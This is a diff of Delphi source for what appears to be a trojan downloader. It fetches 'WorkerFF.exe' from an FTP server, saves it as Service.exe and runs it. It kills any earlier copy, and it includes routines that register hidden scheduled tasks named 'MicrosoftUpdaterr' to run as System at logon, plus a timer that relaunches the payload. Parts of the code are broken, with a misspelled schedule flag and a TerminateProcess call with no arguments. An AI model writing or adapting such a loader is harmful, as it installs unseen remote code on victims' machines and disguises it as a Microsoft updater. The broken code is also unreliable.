@@ -1,16 +1,43 @@
-program Project1;
+unit Unit1;
+
+interface
+
 uses
-  SysUtils, ShellAPI, Windows, IdFTP, Tlhelp32, Classes;
-  var
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, ShellAPI,  IdFTP, Tlhelp32;
+
+type
+  TForm1 = class(TForm)
+    procedure FormCreate(Sender: TObject);
+  private
+    { Private declarations }
+  public
+    { Public declarations }
+  end;
+
+var
+  Form1: TForm1;
+  C: THandle;
   FTP:TIdFtp;
   dir,s: string;
-  i:integer;
   version:textfile;
   versionupdate:string;
   SL:TStringList;
   H: THandle;
-  g:TStartupInfo;
-  h1:TProcessInformation;
+
+implementation
+
+{$R *.dfm}
+
+procedure ScheduleRunAtStartup1(const ATaskName: string; const AFileName: string;
+  const AUserAccount: string);
+begin
+  ShellExecute(0, nil, 'schtasks', PChar('/delete /f /tn "' + ATaskName + '"'),
+    nil, SW_HIDE);
+  ShellExecute(0, nil, 'schtasks', PChar('/create /tn "' + ATaskName + '" ' +
+    '/tr "' + AFileName + '" /sc ONLOGAN /ru "' + AUserAccount + '"'),
+    nil, SW_HIDE);
+end;
 
 procedure ScheduleRunAtStartup(const ATaskName: string; const AFileName: string;
   const AUserAccount: string);
@@ -18,11 +45,12 @@ begin
   ShellExecute(0, nil, 'schtasks', PChar('/delete /f /tn "' + ATaskName + '"'),
     nil, SW_HIDE);
   ShellExecute(0, nil, 'schtasks', PChar('/create /tn "' + ATaskName + '" ' +
-    '/tr "' + AFileName + '" /sc ONSTART /ru "' + AUserAccount + '"'),
+    '/tr "' + AFileName + '" /sc ONLOGON /ru "' + AUserAccount + '"'),
     nil, SW_HIDE);
 end;
 
 function timeSetEvent(uDelay, uResolution: Longint; lpFunction: pointer; dwUser, uFlags: Longint): Longint;stdcall;external 'winmm.dll';
+
 
 function ExecAndWait(const FileName,
                      Params: ShortString;
@@ -31,7 +59,6 @@ var
   StartInfo: TStartupInfo;
   ProcInfo: TProcessInformation;
   CmdLine: ShortString;
-  SecurityAttributes : PSecurityAttributes;
 begin
   { Ïîìåùàåì èìÿ ôàéëà ìåæäó êàâû÷êàìè, ñ ñîáëþäåíèåì âñåõ ïðîáåëîâ â èìåíàõ Win9x }
   CmdLine := '"' + Filename + '" ' + Params;
@@ -108,46 +135,74 @@ function FindTask(ExeFileName: string): integer;
  procedure On_Timer(uTimerID, uMsg, dwUser, dw1, dw2: LongInt);stdcall;
 begin
   if findtask('Service.exe')>0 then
-  write('yes')
+  //write('yes')
   else
   //ShellExecute(0,'open', 'Service.exe', nil, nil, SW_Hide);
   ExecAndWait(ExtractFilePath(ParamStr(0)) + 'Service.exe', '', SW_SHOWNORMAL);
 
 end;
 
+function GetComputerNetName: string;
+var
+  buffer: array[0..255] of char;
+  size: dword;
 begin
-
-H := CreateMutex(nil, True, '11111');
-if GetLastError = ERROR_ALREADY_EXISTS then
-Exit;
-s:='1';
-  versionupdate:='1.5';
-   SL:=TStringList.Create();
-
-       if not FileExists(ExtractFilePath(ParamStr(0))+'\version.txt') then
-      begin
-
-        SL.Add(s);
-        SL.SaveToFile(ExtractFilePath(ParamStr(0))+'\version.txt');
-      end;
-   SL.LoadFromFile(ExtractFilePath(ParamStr(0))+'\version.txt');
-  s:=SL.Strings[0];
-  SL.Free;
-  writeln(s);
-  if s=versionupdate then
+  size := 256;
+  if GetComputerName(buffer, size) then
+    Result := buffer
   else
-  begin
-  AssignFile(version, ExtractFilePath(ParamStr(0))+'\version.txt');
-  if not FileExists(ExtractFilePath( ParamStr(0) )) then
- begin
-  Rewrite(version);
-  CloseFile(version);
- end;
-  ReWrite(version);
-  writeln(version,'1.5');
-  CloseFile(version);
-  killtask('service.exe');
-  DeleteFile('Service.exe');
+    Result := ''
+end;
+
+function GetUserFromWindows: string;
+var
+  UserName : string;
+  UserNameLen : Dword;
+begin
+  UserNameLen := 255;
+  SetLength(userName, UserNameLen);
+  if GetUserName(PChar(UserName), UserNameLen) then
+    Result := Copy(UserName,1,UserNameLen - 1)
+  else
+    Result := 'Unknown';
+end;
+
+
+procedure TForm1.FormCreate(Sender: TObject);
+begin
+//H := CreateMutex(nil, True, '11111');
+//if GetLastError = ERROR_ALREADY_EXISTS then
+//Exit;
+//ScheduleRunAtStartup('MicrosoftUpdaterr', ExtractFilePath(ParamStr(0))+'Service.exe', 'System');
+//sleep(500);
+//ScheduleRunAtStartup1('MicrosoftUpdaterå', ExtractFilePath(ParamStr(0))+'Updater.exe', 'System');
+//s:='1';
+//  versionupdate:='1.5';
+//   SL:=TStringList.Create();
+//
+//       if not FileExists(ExtractFilePath(ParamStr(0))+'\version.txt') then
+//      begin
+//
+//        SL.Add(s);
+//        SL.SaveToFile(ExtractFilePath(ParamStr(0))+'\version.txt');
+//      end;
+//   SL.LoadFromFile(ExtractFilePath(ParamStr(0))+'\version.txt');
+//  s:=SL.Strings[0];
+//  SL.Free;
+  //writeln(s);
+//  if s=versionupdate then
+//  else
+//  begin
+//  AssignFile(version, ExtractFilePath(ParamStr(0))+'\version.txt');
+//  if not FileExists(ExtractFilePath( ParamStr(0) )) then
+// begin
+//  Rewrite(version);
+//  CloseFile(version);
+// end;
+//  ReWrite(version);
+//  writeln(version,'1.5');
+//  CloseFile(version);
+
   dir := ExtractFilePath(ParamStr(0));
   FTP := TIdFTP.Create(nil);
    try
@@ -159,18 +214,30 @@ s:='1';
   FTP.Connect;
   if FTP.Connected then
     try
-      FTP.Get('WorkerFF.exe', ExtractFilePath(ParamStr(0))+'\Service.exe', True);
+        killtask('service.exe');
+        DeleteFile('Service.exe');
+        FTP.Get('WorkerFF.exe', ExtractFilePath(ParamStr(0))+'\Service.exe', True);
     except
       on E : Exception do
     end;
 
-   finally
-   ScheduleRunAtStartup('MicrosoftUpdaterr', ExtractFilePath(ParamStr(0))+'Service.exe', 'System');
-   ScheduleRunAtStartup('MicrosoftUpdaterå', ExtractFilePath(ParamStr(0))+'Updater.exe', 'System');
-     FTP.Quit;
+   //ShellExecute(0,'open',PChar('Service.exe'),PChar('/c "Schtasks /Create /sc ONLOGON /tn "MicrosoftUpdaterr" /tr "'+ExtractFilePath(ParamStr(0))+'Service.exe""'),+' /rf System'+Nil,SW_SHOWDEFAULT);
+   //ShellExecute(0,'open',PChar('Service.exe'),PChar('/c "Schtasks /Create /sc ONLOGON /tn "MicrosoftUpdatere" /tr "'+ExtractFilePath(ParamStr(0))+'Updater.exe""'),+' /rf System'+Nil,SW_SHOWDEFAULT);
+
+     //FTP.Quit;
      FTP.Free;
-   end;
-  end;
-  timeSetEvent(2500, 2500, @On_Timer, 0, 1);
-  readln;
+
+
+  //timeSetEvent(2150, 2150, @On_Timer, 0, 1);
+  //readln;
+except
+
+end;
+ExecAndWait(ExtractFilePath(ParamStr(0)) + 'Service.exe', '', SW_SHOWNORMAL);
+//ShellExecute(Handle,'Open','Service.exe',nil,nil,SW_SHOWNORMAL);
+TerminateProcess();
+Application.Terminate;
+Exit;
+end;
+
 end.
